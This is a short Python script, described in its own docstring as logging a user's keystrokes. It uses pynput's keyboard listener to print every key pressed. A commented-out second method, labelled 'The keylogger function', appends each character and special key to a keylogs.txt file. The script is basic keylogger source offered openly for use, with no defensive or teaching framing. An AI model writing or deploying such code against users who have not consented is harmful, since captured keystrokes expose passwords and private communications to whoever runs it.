'''
script to log key strokes of a user
'''

from pynput import keyboard

def on_press(key):
    # Handle the key event here
    print('Key {0} pressed.'.format(key))

# Create a listener
listener = keyboard.Listener(on_press=on_press)

# Start listening
listener.start()

# Keep the script running
listener.join()


# =========================method 2 ==================
# The keylogger function
# def on_press(key):
#     try:
#         # Logging user input
#         with open('keylogs.txt', 'a') as f:
#             f.write('Key {0} pressed.\n'.format(key.char))
#     except AttributeError:
#         # Logging special keys
#         with open('keylogs.txt', 'a') as f:
#             f.write('Special key {0} pressed.\n'.format(key))

# # Collecting events until stopped
# with keyboard.Listener(on_press=on_press) as listener:
#     listener.join()